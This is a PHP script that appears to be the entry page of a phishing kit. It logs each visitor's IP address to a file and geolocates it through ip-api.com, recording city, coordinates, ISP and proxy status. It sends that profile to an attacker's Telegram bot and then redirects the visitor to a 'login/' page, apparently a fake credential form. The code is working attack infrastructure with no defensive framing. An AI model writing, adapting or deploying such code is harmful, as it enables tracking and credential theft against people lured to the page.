<?php

include "admin/setting/rezlts_settings/bot_settings.php";

$ip = getenv("REMOTE_ADDR");

$file = fopen("KNYGHT_VISIT.txt", "a");

fwrite($file, $ip . "  -  " . gmdate("Y-n-d") . " @ " . gmdate("H:i:s") . "\n");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/" . $ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY = $IP_LOOKUP->city . "\r\n";
$REGION = $IP_LOOKUP->region . "\r\n";
$STATE = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";
$LATITUDE = $IP_LOOKUP->lat . "\r\n";
$LONGITUDE = $IP_LOOKUP->lon . "\r\n";
$TIMEZONE = $IP_LOOKUP->timezone . "\r\n";
$ISP = $IP_LOOKUP->isp . "\r\n";
$ORG = $IP_LOOKUP->org . "\r\n";
$AS = $IP_LOOKUP->as . "\r\n";
$REVERSE = $IP_LOOKUP->reverse . "\r\n";
$DISTRICT = $IP_LOOKUP->district . "\r\n";
$CONTINENT = $IP_LOOKUP->continent . "\r\n";
$MOBILE = $IP_LOOKUP->mobile ? "true" : "false";
$PROXY = $IP_LOOKUP->proxy ? "true" : "false";
$HOSTING = $IP_LOOKUP->hosting ? "true" : "false";

$msg = $ip . "\nCountry: " . $COUNTRY . "City: " . $CITY . "Region: " . $REGION . "State: " . $STATE . "Zip: " . $ZIPCODE . "\n";
$msg .= "Latitude: " . $LATITUDE . "Longitude: " . $LONGITUDE . "Timezone: " . $TIMEZONE . "\n";
$msg .= "ISP: " . $ISP . "Organization: " . $ORG . "AS: " . $AS . "Reverse: " . $REVERSE . "\n";
$msg .= "District: " . $DISTRICT . "Continent: " . $CONTINENT . "\n";
$msg .= "Mobile: " . $MOBILE . "Proxy: " . $PROXY . "Hosting: " . $HOSTING;

file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($msg) . "");

header("Location: login/");
?>
